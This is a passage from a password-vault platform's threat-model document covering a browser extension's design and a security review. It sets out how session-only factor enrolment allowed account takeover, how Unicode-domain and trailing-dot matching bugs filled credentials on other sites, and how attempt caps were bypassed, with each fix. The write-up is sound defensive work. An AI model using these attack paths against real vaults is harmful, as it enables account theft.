the app origin is the weaker one, since its `script-src` is not locked down
(M11). CLOSED: redemption grants no step-up, and the vault origin proves its own
factor through `POST /v1/auth/stepup`, the route widened in PR1 for exactly this.

*The fingerprint ceremony had one side.* The owner reads a code out; the grantee
had nowhere to read theirs, so the only defence against a malicious server
substituting its own key for a grantee's could not be exercised.
`grantee_public_key_sha256` cannot substitute for it — it is derived client-side
from whatever key the client was handed. CLOSED: the grantee's own fingerprint is
displayed, computed from the key the server serves back.

*Residual, unchanged and now stated on the screen rather than implied:* a
released escrow reconstructs the owner's recovery key and this client cannot yet
read their items with it. Release is one-shot, so pressing the button spends the
arrangement. The warning is given BEFORE the action; the reader is a separate
change with its own retention decision, because holding a second owner's master
key in memory is not something to settle inside a fix round.

*Residual, accepted:* an M-of-N escrow above threshold 1 is refused by this
client at both layers. The protocol and the service support it; collecting
several grantees' shares does not exist, and arming an arrangement nobody can
open would be worse than declining to arm it.

## 6j. Threat-model delta — M16 the vault browser extension (2026-08-10)

M16 opens **TB9** (§3, §4): the extension against arbitrary web pages. This
section is written as PR1 begins and is updated by each PR as its controls land,
rather than assembled after the review — the M14 rule that a milestone which
invalidates a sentence owns that sentence.

**Why this is not TB6 with a new client.** TB6's controls are the isolated
origin, its CSP, enforced Trusted Types and an empty dependency tree. None of
them reaches a page we do not serve. An extension is code of ours running beside
code of theirs, on their origin, with read and write access to their DOM — a
channel with no counterpart anywhere else in the platform.

**Decisions and their residuals.** The full list is in docs/04 M16 and the
CLAUDE.md decision log; the security-relevant shape is:

- *Keys* live as non-extractable `CryptoKey`s in an offscreen document, the only
  extension context that loads `@estate/vault-crypto`. Persisting a `CryptoKey`
  in extension IndexedDB — possible, and the option the brief's premise hid — is
  REFUSED, because it yields a vault permanently open with no password, no
  Secret Key and no TOTP, defeating 2SKD and §5 of docs/01. *Residual:* while
  unlocked, code in that context decrypts everything; non-extractability stops
  exfiltration, not use.
- *The extension is server-anchored.* It caches item ciphertext and nothing that
  enables an offline unlock, so the offline brute-force target M15 kept off the
  disk stays off it. *Residual:* no unlock without connectivity.
- *Origin matching* is the boundary's defining control; see §4 TB9.
- *The credential* is a refresh-capable `extension`-audience session, admitted
  PER HANDLER to SEVEN vault routes (`keysetStatus`, both SRP legs, `listItems`,
  `createItem`, `updateItem`,
  `lock`) and THREE identity ones (`session`, `stepUp`, `logout`). What a stolen
  copy buys, end to end: the ability to attempt an SRP handshake, which
  additionally requires a fresh step-up, the vault password and the Secret Key —
  and no item, because every item route — read OR write — is behind
  `VaultSessionGuard`. SIXTEEN vault routes refuse it, including `reset`, both
  keyset routes, `deleteItem` and every emergency-access route; so does
  `mintHandoff`, so a leaked extension session cannot chain itself into a vault
  one. (It was eighteen until M16 PR4a admitted the two writes; the count is
  derived from the controllers by `session-audience.spec.ts`, so it cannot drift
  from the code — only from this sentence, which is why the sentence is edited
  with it.)
  *Stale by construction, and deliberately not edited:*
  `apps/services/identity/migrations/006_extension_audience.sql` still says
  "five vault routes". The migrator checksums applied files and raises
  `MigrationDriftError` on a mismatch, so correcting it would break every
  deployment that has already run it. A migration is a record of what was true
  when it ran; the live count lives here and in the spec that derives it.
  `POST /v1/auth/refresh` is deliberately absent from that count and is not an
  omission: it carries no guard at all, being unauthenticated by construction,
  so there is no audience decision to declare there. What keeps it safe is a
  different property — refresh ROTATES IN PLACE, updating the same session row,
  so a refreshed session cannot change what it is for. That was true by accident
  of an UPDATE's SET list until M16 pinned it with a test.

**What M16 closes that predates it.**

- *§6a's rate-limiting residual, in part.* Step-up now carries an attempt cap
  derived from the append-only `auth_events` ledger, which bounds the vault's SRP
  legs TRANSITIVELY because both are step-up gated. The half that remains open is
  a caller with a genuine step-up burning handshakes.
- *No user-reachable session revocation.* Before M16, `revokeAllForUser` had one
  caller behind a service credential, and identity exposed no session listing, no
  revoke-by-id and no password-change or password-reset route — so the only way
  to revoke a session was to present it. (M17 PR2 closed the password-CHANGE
  half of that sentence and PR3 closed the RESET half, so identity now exposes
  all three. It also gives the sentence a second
  meaning: a password change now revokes every OTHER session in the same
  transaction, so the ordinary remedy for "something has my credentials" is one
  action rather than a per-row sweep.) Tolerable while every session was one
  cookie-bound browser; not tolerable beside a long-lived credential on a device.
  PR1 ships the first paired-devices list with per-row revoke, ON A SURFACE and
  in the same PR as the routes: an owner can see every live credential on their
  account and end any of them. Revocation is deliberately UNGATED — the M6 rule
  that the protective action must never be harder than the permissive one, with
  minting the pairing code as the gated half — while the row for the caller's
  OWN session goes through logout instead, because only logout also expires the
  cookies carrying it, and a browser that still looks signed in over a dead
  session is the M8 logout entry's worst outcome. What a row can SAY is bounded
  by what identity returns: an audience and two timestamps, no IP and no device
  name, since those columns exist and nothing writes them. So a row identifies a
  credential by what it can REACH rather than by where it is — which is also the
  one place a user reads the boundary this milestone exists to create.
- *A fence that was documented and never written.* `004_session_audience_and_
  handoffs.sql` claimed a spec pinned its `CHECK` to `SESSION_AUDIENCES`; none
  existed. PR1 writes it, mutation-tested.

**Residuals carried, not closed.**

- *A compromised store update is undetectable by the platform.* Reproducible
  builds and published provenance make it discoverable by a third party.
- *Autofill does not resist phishing.*
- *App-origin script can read a pairing code out of the DOM*, buying a paired
  extension that reaches ciphertext only and appears in the owner's device list.
  PR1's surface displays the code in a `<code>` text node, deliberately behind a
  step-up and shown once, which is the shape M13's link code already takes; what
  it does not do — and cannot, on an origin whose `script-src` M11 recorded as
  not locked down — is keep script on that origin from reading it. The device
  list is what makes the result VISIBLE rather than silent.
- *An older audit consumer drops an action it does not know.* A rolling deploy
  where identity is ahead of the audit service loses those events: an
  unrecognised action is a `schema_violation` to the consumer, indistinguishable
  from malformed input. Observed as absence during PR1's live drive (the mint
  and pairing events emitted before the audit service was rebuilt never reached
  `audit_events`); the rejection itself was read from `ingestor.ts` rather than
  seen, because the container's logs did not survive its restart. Deploy order —
  contracts consumers first — is the mitigation, and it is not enforced anywhere.
- *Rotation-reuse detection can self-revoke* an extension whose service worker
  died mid-rotation. The behaviour is correct; the cost is a re-pair.
- *REVOKING A PAIRED DEVICE IS NOT INSTANT DOWNSTREAM.* Identity revokes the row
  synchronously and answers 401 immediately, but every other service resolves a
  caller through `HttpSessionVerifier`, whose positive cache is keyed by
  sha256(token) with `DEFAULT_CACHE_TTL_MS` of 30 seconds (2026-07-23). So a
  revoked extension session keeps working at the vault service for up to that
  window. MEASURED in PR1's live drive rather than reasoned about: immediately
  after the revoke, identity answered 401 and the vault answered 200; 33 seconds
  later the vault answered 401.

  The cache itself is a deliberate trade and is not the problem — negatives are
  never cached, precisely so a transient identity outage cannot lock out valid
  tokens. What M16 changes is the COST of that window. Before, it meant a
  revoked browser session lingered briefly. Now the product ships a control whose
  stated purpose is "I think my extension is compromised, kill it", and the
  credential outlives the screen that says it is gone.

  Bounded rather than alarming: what survives the window is a session that
  reaches seven vault routes, five of which yield ciphertext and two of which WRITE it — the item
  reads sit behind `VaultSessionGuard`, which needs a completed SRP unlock, and
  that needs the vault password and the device Secret Key. It cannot reset a
  vault, replace a keyset, delete an item, touch emergency access, or mint
  another credential. The 30 seconds buy an attacker who already holds the token
  nothing they did not have a moment earlier.

  What was OWED is that the surface not promise more than the platform delivers.
  A revoke control that reads as instantaneous while a downstream service still
  admits the token is the M9 shape inverted — not a control reading as an
  outage, but an outage-free UI reading as a stronger control than it is.
  Shortening the TTL is the wrong fix (it trades a stated availability property
  for a cosmetic one); saying so on the screen is the right one.

  *CLOSED 2026-08-12, as copy.* `SecurityPanel` said "that takes effect
  immediately" above the list and "can no longer be used" after a revoke; both
  were false for up to one TTL. One `PROPAGATION_SENTENCE` now serves both
  sites — "signing in with it is refused straight away; other parts of the
  platform can take up to N seconds to stop accepting it" — so the confirmation
  someone reads while acting on a suspected compromise carries the same caveat
  as the paragraph they may never have read. N is DERIVED from
  `SESSION_CACHE_TTL_MS`, which `step-up.test.ts` already pins to auth-guard's
  `DEFAULT_CACHE_TTL_MS` by reading that file, so raising the TTL moves the
  sentence rather than falsifying it again. The window itself is unchanged and
  remains the deliberate trade it always was.

**Added by PR2a (the extension and its transport).**

- *The refresh token is on disk.* `chrome.storage.local` is not memory-backed, so
  a paired device keeps a refresh-capable credential for up to its 30-day life
  where local malware or another process running as the user can read it.
  `chrome.storage.session` was rejected for it: pairing is deliberately once per
  browser and repeating it needs a step-up on the APP origin, so a device that
  forgot its pairing on every browser restart would push people through that
  ceremony daily and, predictably, into not using the extension. WHAT BOUNDS IT
  IS THE AUDIENCE, not the storage — the credential reaches seven vault routes and
  three identity ones and nothing else, cannot reset a vault, replace a keyset,
  delete an item, touch emergency access, mint another handoff or enumerate the
  owner's other devices, and still decrypts nothing, because every item read sits
  behind a vault session that only a completed SRP unlock produces. It is also
  visible in the owner's paired-devices list and revocable from there in one
  click. No key material is ever written there, in PR2b or later.
- *One more unauthenticated identity route is reachable through the vault
  origin.* The edge proxies `POST /v1/auth/refresh` (and pairing redemption) as
  credential-free pass-throughs, so that the extension needs one
  `host_permission` and one origin rather than addressing identity directly. Both
  are exact-match paths carrying no bearer, neither can be READ cross-site
  because this edge sets no CORS headers and answers no preflight, and identity's
  own uniform refusals are unchanged. `POST /v1/auth/logout/refresh` remains
  deliberately unreachable.
- *The revocation window above, confirmed from the other end.* PR2a's live drive
  measured it from the extension's side rather than the owner's: after logout,
  identity refused the token at t+0 while the vault — reached through the edge on
  the same token — answered 200 at t+0 and t+10 and 401 from t+20. Same 30-second
  positive cache, same conclusion, two independent measurements.

**Added by PR2b (unlock and read).**

- *The Secret Key is remembered on disk, so two of three factors sit on one
  disk.* 2SKD derives every vault key from the vault password AND a 128-bit
  device Secret Key; the extension keeps the latter in its IndexedDB by default,
  with an explicit opt-out and copy saying what that costs. The alternative —
  retyping 26 characters at every unlock, against a 15-minute vault session that
  cannot be renewed — reliably pushes people to a text file, which is worse. But
  this artifact ALREADY holds a 30-day refresh token on disk, so local malware
  or another process running as the user now finds both, missing only the
  password; and unlike the vault ORIGIN, whose defence is an empty dependency
  tree, `script-src 'self'` and enforced Trusted Types, this is a signed artifact
  auto-updated through a vendor store with no CSP in its path (§4 TB9). WHAT IT
  STILL DOES NOT BUY IS AN OFFLINE UNLOCK: the wrapped master key, the SRP salt
  and the KDF parameters arrive from the server per unlock and are never stored,
  so opening a vault needs the password and a live handshake on a live extension
  session — which appears in the owner's paired-devices list and is revocable
  from there in one click. The Secret Key is forgotten when the device is
  disconnected.
- *The offscreen document is not a boundary against the rest of the extension,
  and must not be read as one.* `chrome.runtime.sendMessage` delivers to every
  extension context with a listener, so the vault password and Secret Key transit
  a broadcast the service worker also receives and ignores by `target`. That is
  a routing filter. All extension contexts are one signed artifact and one trust
  domain: the offscreen document buys LIFETIME (an MV3 service worker is
  terminated in seconds) and NON-EXTRACTABLE key storage, not secrecy from the
  popup. Anyone who can read that channel has already compromised the artifact
  and could ask the worker to decrypt instead. What the split does buy is
  auditability — the key holder cannot reach the network and the host cannot
  decrypt, so "can anything derived from the password leave the device" is a
  one-file question.
- *IT HAS RUN IN A BROWSER NOW, AND CI RUNS IT EVERY TIME.* This paragraph used
  to open "NOTHING HERE HAS RUN IN A BROWSER" and to explain that CI could not
  load a packed extension. The second half was wrong — `--load-extension` is
  refused by Chrome 151, but the CDP command `Extensions.loadUnpacked` is not —
  and the `browser-smoke` job in `.github/workflows/extension.yml` is what that
  correction bought. It EXTRACTS THE PACKED ARCHIVE and drives those bytes: the
  manifest is accepted by Chrome, the service worker boots,
  `chrome.offscreen.createDocument` succeeds from it, the offscreen document
  comes up, `/lib/vault-crypto/index.js` resolves at the absolute path the
  client actually loads, and a REAL SRP-6a unlock against a stand-in speaking
  the real protocol returns an unlocked vault whose item decrypts to its title.
  A wrong Secret Key is refused BY THE SERVER. Finally the central claim —
  nothing derived from the vault password or the Secret Key leaves the device —
  is asserted over bytes that crossed a real socket out of a real browser, which
  is a materially stronger statement than the same assertion against a recording
  transport in Node.
  *Still not exercised, and named rather than implied:* the FILL, because
  `activeTab` needs a genuine user invocation and a programmatic
  `chrome.action.openPopup()` grants nothing (measured); IndexedDB under the
  extension origin; and anything about the real vault SERVICE, since the
  stand-in has no sessions, audiences, step-up or guards. This is the same status the
  repository gives the Plaid live client and the Anthropic adapter — the first
  real load is a deployment event, not a test result — and it is stated here
  rather than left to be inferred from a green suite.
- *The IndexedDB premise is now MEASURED, and the brief was wrong about it.* The
  roadmap REJECTS persisting a non-extractable `CryptoKey` in extension
  IndexedDB on CEREMONY grounds — it would yield a vault permanently open with
  no password, Secret Key or TOTP, defeating 2SKD and docs/01 §5 — and
  explicitly NOT on the brief's serializability grounds, which CLAUDE.md
  recorded as a claim to measure. PR1 did not measure it; PR2b has, in a real
  Chromium: a non-extractable `CryptoKey` structured-clones successfully and the
  clone is still `extractable: false`; IndexedDB accepts it; and after a page
  navigation it comes back as a `CryptoKey`, still non-extractable, with
  `exportKey` still refusing and an AES-GCM round trip still working. So the
  brief's premise is FALSE in the direction that matters, exactly as docs/04's
  correction claimed — now demonstrated rather than asserted. THE REJECTION IS
  UNAFFECTED: it never rested on that premise, and a key that persists this well
  is precisely what makes the ceremony argument bite.
  *Still unmeasured, and handed over rather than claimed:* survival across a full
  BROWSER RESTART, and the same sequence under a real `chrome-extension://`
  origin. A scratch unpacked probe exists for both; it is deliberately not
  committed, because a key-persistence harness inside an artifact that must not
  persist keys is the wrong thing to be right about.

**Added by PR3a (origin matching).**

- *Confusable detection is partial, and §4 TB9 now says so.* Caught: punycode
  that is not the saved domain, an ASCII homoglyph skeleton fold, and
  edit-distance-1. Not caught: the general Unicode confusable case, which needs
  UTS #39 skeletons over a vendored confusables table — a named follow-up. The
  failure direction is safe: an unrecognised confusable is a `no-match`, so it is
  refused for filling and merely goes unexplained. Worth stating because the
  scope decision for this PR was taken on a claim that `rn`/`m` was covered by
  edit distance, which it is not — the homoglyph fold exists because a test
  refused to pass.
- *WRITE AND FILL ARE ONE TRUST LEVEL, and that is the sharpest consequence of
  M16 PR4a.* The item's `url` lives INSIDE the encrypted blob, and `fillFor`
  re-decides the origin from it — so anything that can write an item can repoint
  where that item's credential is later filled. The origin control is not
  bypassed; it is FED. This buys an attacker persistence rather than access
  (writing already requires an unlocked vault, and anything that can write can
  also read the credential outright), but it survives the session in which it
  was done, which reading does not. Treat "may write items" as equivalent to
  "may direct where those credentials go", and never grant one expecting the
  other to bound it.
- *An unlocked extension can overwrite every item, and there is no restore
  surface.* `deleteItem` stays refused, so the destructive verb is out, and
  `vault_items_versions` captures BEFORE UPDATE OR DELETE — but NO PRODUCTION
  CODE READS THAT TABLE. Recovery today means an operator with psql. "Recoverable"
  is therefore true of the data and not of the product, and the two are recorded
  apart rather than allowed to sound like one claim. A restore surface is the
  obvious follow-up and belongs with the operator platform (TB7).
- *An edit needs no read, and that was a choice rather than a limitation.* The
  popup cannot open an item: `summarise` yields titles and `fillFor` yields one
  credential for a page that matches. Editing normally requires reading the item
  back, which would have made the popup a general vault reader. Instead the key
  holder MERGES — the caller sends only the fields it is changing, and the
  plaintext it did not send is never sent back. The cost, stated on screen: a
  field left blank keeps its saved value, so clearing one is not expressible in
  the extension.
- *A stale Public Suffix List over-matches, narrowly.* The snapshot is vendored
  and digest-pinned because this package must not fetch a security parameter at
  runtime, which trades tampering-in-transit for staleness. A suffix added after
  the snapshot is unknown, so `registrableDomain` falls back to the implicit `*`
  rule and returns a SHORTER domain — which can make two hosts under a new
  multi-label registry compare equal. The staleness check is deliberately a
  one-year bound rather than a weekly one, because a check that fails constantly
  is one people learn to bump.
- *THE SAME OVER-MATCH HAPPENED FOR EVERY INTERNATIONALISED SUFFIX, and it was
  neither narrow nor hypothetical — found while scoping PR3b, fixed before it.*
  The published list writes internationalised rules as U-LABELS (`公司.cn`)
  while `URL.hostname` applies IDNA and always returns the A-LABEL
  (`a.公司.cn` → `a.xn--55qx5d.cn`). `labelsMatch` compares raw strings and
  nothing converted, so 459 of the 10,239 rules were absent from the algorithm
  entirely: the longest match fell back to the bare TLD, every registrant under
  those registries collapsed onto ONE registrable domain, and `matchOrigin`
  answered `match` for two different registrants. Measured, not reasoned about —
  `bank.公司.cn` and `shop.公司.cn` both resolved to `xn--55qx5d.cn` and
  compared equal, which is a credential offered on somebody else's site. That is
  the label-stripping failure this section calls the boundary's defining one,
  reached by a route the ASCII tests could never take, which is why every one of
  them passed over it. Rules are converted at GENERATION time now, so the
  vendored `.dat` stays byte-for-byte as published, the runtime stays a plain
  string compare, and no IDN implementation enters a package with no
  dependencies. It was latent while PR3a had no fill; PR3b is what would have
  made it exploitable.
**Added by PR5 (the security review).**

Seven file-scoped discovery lenses over the M16 range, then every candidate
confirmed by MEASUREMENT — mutation or execution against real Postgres, a real
jsdom page, or the modules run directly — before anything was changed. TENTH
milestone running where every confirmed finding sits in machinery the milestone
introduced, with one exception that is the most serious thing in the list and is
older than M16.

- *AND THE FIRST FIX WAS TOO NARROW — the same escalation was still open through
  WEBAUTHN, found by verifying it.* `POST /v1/auth/webauthn/register/verify` was
  `SessionGuard`-only and `WebAuthnService` grants step-up on a successful
  assertion, so a caller holding nothing but a session could bind an
  authenticator OF THEIR OWN and elevate with it. MEASURED end to end against
  real Postgres before anything was changed: registration succeeded, and the
  attacker's session row came back `mfa_level=stepup` with a live
  `stepup_expires_at`. `excludeCredentials` looks protective and is not — it
  stops re-registering the SAME authenticator, never a different one.
  It was QUIETER than the TOTP version, which is the part worth remembering.
  That one locked the owner out (`findActiveTotp` takes the newest, so their
  codes started failing — a signal); here the victim's factors keep working, so
  nothing they can observe changes. And it also cleared the M16 step-up attempt
  cap, since WebAuthn writes `stepup.granted`.
  A PER-TYPE PREDICATE LEFT A HOLE IN BOTH DIRECTIONS: `hasVerifiedTotp` is
  false for an account holding only a passkey, so the TOTP-only fix would still
  have admitted a session-only caller enrolling TOTP on a passkey-protected
  account. **Closed** by `SecondFactorGate`, one predicate over both stores —
  "does this account hold ANY factor it could be made to prove" — called from
  `enrollTotp` and from BOTH ends of the WebAuthn registration ceremony (the
  options end so a refusal comes before the hardware ceremony, the verify end
  because that is the write). The bootstrap residual is unchanged and still
  stated: a first factor cannot be gated, so an account with none is still
  reachable by a stolen session.
- *THE GATE IS INVISIBLE TO EVERY OTHER FENCE, WHICH IS WHY IT HAS ITS OWN.*
  The condition is account state, so the gate cannot be a `StepUpGuard`
  decorator — and every fence in this repo that checks step-up gating scans for
  that decorator. That is precisely how the WebAuthn route sat ungated while its
  TOTP twin was being fixed one file away.
  `apps/services/identity/test/factor-routes.spec.ts` closes it, and it
  discovers by WHAT THE CODE DOES rather than by a remembered list: it scans for
  calls to the repo methods that WRITE factor state, resolving the receiver from
  its TYPE annotation rather than its field name, so a new enrolment path is
  found by the write it has to make whatever it is called. Mutation-tested four
  ways — a deleted gate, a brand-new undeclared method that binds a credential
  (discovered and named), a renamed repo field (correctly still green, because
  the anchor is the type), and a revert to the TOTP-only predicate. It found a
  genuine error in its own declaration table on its first run, and a name
  collision on its second (`EmailVerificationRepo` also has a `markVerified`),
  which is what drove the type anchoring.
- *THE WORST FINDING IS PRE-EXISTING AND M16 IS WHAT MADE IT MATTER: a stolen
  session could ENROL ITS OWN SECOND FACTOR.* `POST /v1/auth/totp/enroll` had
  been `SessionGuard`-only since M2. `revokeUnverifiedTotp` spares a VERIFIED
  method while `findActiveTotp` takes the NEWEST one, so a caller holding
  nothing but a session could enrol a secret of their own, confirm it with a
  code they computed themselves, and step up — three ordinary requests, no
  guessing. Measured end to end against real Postgres, including the second
  half: the owner's own authenticator answered 401 afterwards, so it was a
  takeover AND a lockout, of every docs/01 §5 action and of §5.1's liveness
  proof. The repository had already seen the mechanism and read it as a
  test-seeding nuisance (CLAUDE.md 2026-08-06, on why the settlement e2e caches
  enrolment). M16 is what made it acute: it built an attempt cap whose entire
  premise is that step-up bounds a stolen credential, and widened `stepup` to
  two more audiences. **Closed** by gating enrolment on a fresh step-up WHEN A
  VERIFIED FACTOR ALREADY EXISTS. *Residual, and it cannot be closed here:* for
  an account that never enrolled a factor, a stolen session still buys the
  bootstrap — there is no proof to demand. Such an account had no second factor
  to defeat. **The second half of this residual is CLOSED by M17 PR2**: it used
  to read "and identity cannot warn the owner because M14 deliberately made it
  not a holder of the notifications SEND credential", which was true when
  written and is now false in the direction that matters. Identity holds an
  ACCOUNT-SECURITY send edge of its own (`NOTIFICATIONS_SECURITY_INTERNAL_TOKEN`,
  §6l) and still holds no estate-send credential, so it can tell an owner their
  credentials changed without gaining the power to ring "a death report was
  filed on your account". What remains unwarned is the enrolment bootstrap
  itself — that kind does not exist yet, and adding one is a decision about
  which account events are worth a mail rather than a capability question. *Second residual,
  recorded not fixed:* a legitimate re-enrolment silently retires the previous
  authenticator, because `findActiveTotp` takes the newest. "Add a device" and
  "replace a device" are different intentions and the platform offers one
  behaviour for both; it is behind step-up now, so only the owner can cause it.

- *THE ATTEMPT CAP WAS BYPASSABLE BY ONE ROUTE.* `POST /v1/auth/totp/verify`
  checks the SAME `mfa_methods` row and had no cap of any kind, and its failures
  are a kind the counter did not count. Measured: forty wrong codes, forty 401s,
  never a 429, counter still zero — after which the code the guessing found
  elevated at `stepup` on the first try, spending none of the five.
  `stepup.ts`'s own "one chokepoint covers both" was wrong by one route.
  **Closed** — the failure and success kinds are SETS, both routes pass one
  gate, and `test/second-factor-kinds.spec.ts` scans the service so a third
  checker of the secret arrives declared or turns red.

- *THE CAP WAS A RENEWABLE LOCKOUT AGAINST THE OWNER, which its own docstring
  claimed a rolling window avoided.* The count was keyed on the USER and every
  live session wrote into it, so five wrong codes from ONE credential — the
  30-day extension token on disk being the cheapest — refused every OTHER
  session of the account. Measured: the owner's untouched session got 429 where
  it should have got 401. The only thing that clears the window is a success,
  which is what the 429 prevents, so five denials each quarter-hour hold it
  there indefinitely: the sticky lock the file says it refused to build,
  re-armed on a timer, blocking vault open, document generation, export,
  beneficiary changes, deletion and §5.1's rescue path. **Closed** with two
  scopes — a per-session cap a stolen credential exhausts on itself, under an
  account-wide ceiling that stays the real bound on guessing. *Residual:* an
  attacker who can MINT sessions (i.e. holds the password) can still walk the
  account total to its ceiling. That is the bar the account cap exists for.

- *ONE IDN PAGE DISCLOSED THE WHOLE VAULT.* See §4 TB9 above; **closed**, and
  the page-level notice replaces the per-item claim.

- *A DOUBLED TRAILING DOT COLLAPSED TWO REGISTRANTS ONTO A BARE SUFFIX.*
  `normaliseHost` stripped ONE trailing dot and was called twice on different
  strings, so `publicSuffix`'s empty-label guard never fired: `bank.com..` and
  `evil.com..` both resolved to `com.` and `matchOrigin` answered `match`.
  `URL.hostname` preserves the doubled dot, so the input is reachable, though
  both sides must carry it. **Closed** by making normalisation idempotent — a
  function called twice must agree with itself.

- *KEY MATERIAL SURVIVED A FAILED UNLOCK.* `prepare()` runs before the second
  SRP leg, so a refused or malformed `srp/verify` returned with the AUK and the
  SRP private key still resident — and because the idle clock is armed only on
  SUCCESS, nothing was scheduled to collect them. Only an offscreen teardown
  would ever have taken them. **Closed**: every non-success exit drops them.

- *A REVOKED PAIRING KEPT THE SECRET KEY ON DISK.* `forgetSecretKey` had two
  callers — the explicit opt-out and the VOLUNTARY disconnect. The path an owner
  takes when they revoke a device they believe is compromised forgot the session
  and left half the key material behind, so the protective route was the weaker
  of the two. **Closed.**

- *SMALLER, ALL CLOSED:* a refused injection rendered as "no password field was
  found on this page", collapsing a control into an absence on the one signal
  that says the platform refused; the vault edge's credential precedence fell
  through to the cookie on a MALFORMED `Authorization` header, so "never looks
  at the cookie" held only for well-formed input; and two shipped docstrings
  still said the extension credential "reaches five vault routes" four PRs after
  PR4a made it seven.

- *THE ROUTE-AUDIENCE FENCE WAS NAME-KEYED.* It scanned source for the literal
  `@AllowSessionAudiences`, while both guards resolve `SESSION_AUDIENCE_METADATA`
  through `Reflector.getAllAndOverride` — so an aliased import or a raw
  `SetMetadata` widens a route and is matched by nothing. Only `vault` and
  `identity` have a second-layer spec reading real handler metadata; for the
  other seven services that scan is the whole enforcement. This is the shape the
  credential graph was fixed for twice (2026-07-28, 2026-08-07). **Closed** by
  additionally asserting the metadata key has exactly one route into it,
  mutation-tested with a real alias.

- *STATED, NOT FIXED — WHAT THIS REVIEW DID NOT DO.* Nothing in the review ran
  in a real browser: the extension's own claims rest on jsdom and the crypto on
  Node's WebCrypto. One of the two things it recorded as owed has since been
  MEASURED; the rest stands.

- *`activeTab` REVOCATION, MEASURED — Chrome 151.0.7922.110, macOS.* The review
  left this open, noting that the fill-time re-read makes the boundary hold
  either way but that the platform's actual behaviour was unmeasured here. It
  is measured now, with a scratch probe extension holding `activeTab` and
  `scripting` and NO host permissions, so the grant was the only thing in play.
  The grant was taken with a real OS-level keyboard invocation of the action —
  a programmatic `chrome.action.openPopup()` from the service worker opens the
  popup and does NOT grant, which the run's control caught before any result was
  believed.

  | navigation from `a.test:8899` | grant |
  | --- | --- |
  | same origin (`a.test:8899/three`) | **survives** — still injects |
  | different host (`b.test:8899`) | **revoked** |
  | same host, different port (`a.test:8900`) | **revoked** |
  | subdomain, same site (`sub.a.test:8899`) | **revoked** |

  So the grant is ORIGIN-scoped and any cross-origin navigation revokes it. Two
  consequences worth keeping. First, the pre-fix TOCTOU really was being held
  shut by the platform rather than by the extension's own logic, exactly as the
  review suspected — which is why re-reading the tab at the gesture was the
  right fix regardless: it makes the code's stated claim true instead of resting
  on undocumented behaviour nobody here had checked. Second, THE PLATFORM IS
  STRICTER THAN OUR OWN MATCHER: `matchOrigin` treats a subdomain as the same
  registrable domain and would fill there, while the grant does not survive the
  navigation to it. Nothing depends on that asymmetry, but it means a same-site
  redirect loses the grant, which is a refusal a user may see and which is
  correct.

  *Bounded, and stated as such:* one Chrome build, one platform, a probe
  extension rather than the shipped artifact, and a keyboard invocation rather
  than a toolbar click. Both are user invocations; if the two ever diverge, this
  measured the keyboard one.

- *`activeTab` discloses the active tab's URL to the extension.* That is the
  minimum origin matching can run on, and it is bounded by the permission itself:
  granted only when the user clicks the extension, revoked on navigation, and
  carrying no ability to run code (that is `scripting`, still absent). There is
  no standing view of browsing, and no history.

## 6k. Threat-model delta — M17 PR1, the abuse bounds (2026-08-12)

**Before this change the platform had exactly one rate limit, on the second
factor, and it was the only one in the product.** `POST /v1/auth/login` accepted
password guesses at whatever rate a caller could sustain, each costing one
Argon2id verification; `POST /v1/auth/register` accepted registrations at 64 MiB
of memory-hard work apiece, paid before it looked to see whether the address
existed. `recordLoginFailure` wrote a `login.failed` row on every failure and
**nothing has ever read one**. Four residuals in this document (§6a, §6b, §6g,
§6i) deferred to "identity's login rate limiting" as a standing follow-up. This
is that follow-up, for login and register only. **A third bound was added by
the M17 PR6 review** — `POST /v1/auth/password` verifies the current password
and this delta's own framing ("the routes that take a password from an
unauthenticated caller") is exactly why it was missed; see §6p.

**Two bounds, because one selector cannot see the whole surface.**

| | keyed on | where it lives | what it sees |
|---|---|---|---|
| account | `user_id` | `auth_events`, the M16 predicate | guessing against an account that EXISTS |
| address | email blind index | **in memory, per process** | everything else — unknown addresses, register probes |

The account half is blind to most of what needs bounding, and structurally so:
`recordLoginFailure(null, …)` writes a NULL user whenever the identifier does not
resolve, and register's duplicate path returns having written no row in either
direction. So an attacker spraying one password across many addresses, and every
register probe, produce nothing a user-keyed predicate can count. The
address-keyed half is therefore the PRIMARY bound and the account half is the
durable ceiling behind it.

**The blind index is deliberately NOT added to `auth_events`.** That table is
append-only (`REVOKE UPDATE, DELETE`) and carries no `dek_id`, so an
`email_bidx` column there would permanently and unshreddably record a
correlatable identifier for addresses belonging to NO ACCOUNT — people who never
registered, typed at a login box by somebody else, with no erasure path. It
would also invert M9's "no blind index, lookup by user id only" decision for the
delivery store, and the index it needs is a plain `CREATE INDEX` inside the
migrator's BEGIN/COMMIT, which `005_auth_events_index.sql` already records as
taking a SHARE lock that blocks INSERT on the authentication write path.

**LOGIN REFUSES WITH THE SAME 401 A WRONG PASSWORD GETS.** This is the
load-bearing decision. A 429 on login is an account-existence oracle however the
counter is keyed, because it is a state a caller reaches only by naming
something the platform counted: past the threshold a live address would answer
429 while an address with no account answers 401 forever. That is perfectly
reliable, timing-independent, and would defeat the `dummyVerify` equalization
`password.ts` calls mandatory — the control manufacturing the oracle it was
added to bound. Register does answer 429, and that is safe for the mirror-image
reason: its bound is keyed on the submitted address alone and counted whether or
not an account exists, so the refusal depends on nothing the caller does not
already know.

**Ordering is a control, not arrangement.** The address check runs BEFORE the
user lookup — safe because its answer is existence-independent, and it is the
only thing standing between an unauthenticated caller and Argon2id. The account
check runs AFTER the password verification, which looks wasteful and is the only
correct placement: checking it earlier would let an over-cap account answer fast
while an unknown address still paid a full hash, which is the timing oracle this
route burns a dummy verification to close. Both orderings are pinned by
`test/rate-bounds.spec.ts`, because both produce a working rate limiter and only
one closes the channel.

### Residuals, stated rather than implied

- *The account bound has NO per-credential scope, so a sustained attack denies
  NEW logins for that account.* M16's escape from the renewable-lockout trap was
  a per-session scope; login has no credential at the point of failure, and no
  restructuring invents one. Anyone who knows an address can submit wrong
  passwords for it and hold the account at its ceiling for as long as they keep
  it up. **What bounds the harm is that the bound touches the login route only:**
  a session that already exists keeps working, keeps refreshing, and reaches
  every route in the product, because `findLiveByAccessHash` and
  `findLiveByRefreshHash` consult no counter. That is not the M16 situation,
  where the refusal blocked the one action that could clear the window and
  simultaneously blocked vault open, document generation, export, beneficiary
  changes, deletion and §5.1's liveness proof. Twenty per fifteen minutes is set
  so no legitimate user meets it, which makes reaching it a burst signal rather
  than a support ticket. Proven, not asserted:
  `test/login-bound.int.spec.ts` drives an attacker to the ceiling and shows the
  owner's live session and refresh token still resolving.
- *The address bound is per PROCESS and evadable three ways.* It survives no
  restart, is not shared between replicas (so the effective limit is N × the cap
